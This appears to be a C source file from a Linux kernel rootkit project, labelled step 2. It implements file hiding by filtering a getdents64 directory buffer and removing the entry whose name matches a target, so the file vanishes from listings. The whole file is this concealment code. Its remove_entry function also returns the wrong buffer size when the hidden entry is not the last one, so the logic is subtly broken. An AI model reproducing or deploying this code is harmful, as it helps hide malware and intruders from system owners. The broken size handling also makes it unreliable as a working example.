#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include "step2.h"
#include <linux/module.h>
#include <linux/dirent.h>



static unsigned long remove_entry(void* buffer, unsigned int buffer_size, int entry_offset, int entry_size);


///
/// @param getdents_buffer
/// @param getdents_buffer_size
/// @param filename_to_hide
/// @return new buffer size
unsigned long step2_hide_file_by_name(void* getdents_buffer, size_t getdents_buffer_size, char* filename_to_hide){
    unsigned long offset = 0;

    // find entry to hide
    while(offset < getdents_buffer_size){
        struct linux_dirent64* current_ent = (struct linux_dirent64* )(getdents_buffer + offset);
        if(strcmp(current_ent->d_name, filename_to_hide) == 0){
            pr_info("Hidding %s\n", current_ent->d_name);
            return remove_entry(getdents_buffer, getdents_buffer_size, offset, current_ent->d_reclen);
        }
        offset += current_ent->d_reclen;
    }

    return getdents_buffer_size;
}

unsigned long remove_entry(void* buffer, unsigned int buffer_size, int entry_offset, int entry_size) {
    // ptr of entry
    void* dest = buffer + entry_offset;
    // ptr of next entry
    void* src = dest + entry_size;
    // count of entries from entry to hide to end
    unsigned long count = buffer_size - entry_offset - entry_size;

    if(count == 0){
        // nothing to copy it is last entry
        return buffer_size - entry_size;
    }
    else {
        // offset     2
        // nextOffset 3
        // [0, 1, 2, 3, 4]
        // -----[        ] dest
        // --------[     ] source
        memcpy(dest, src, count);
        return count;
    }
}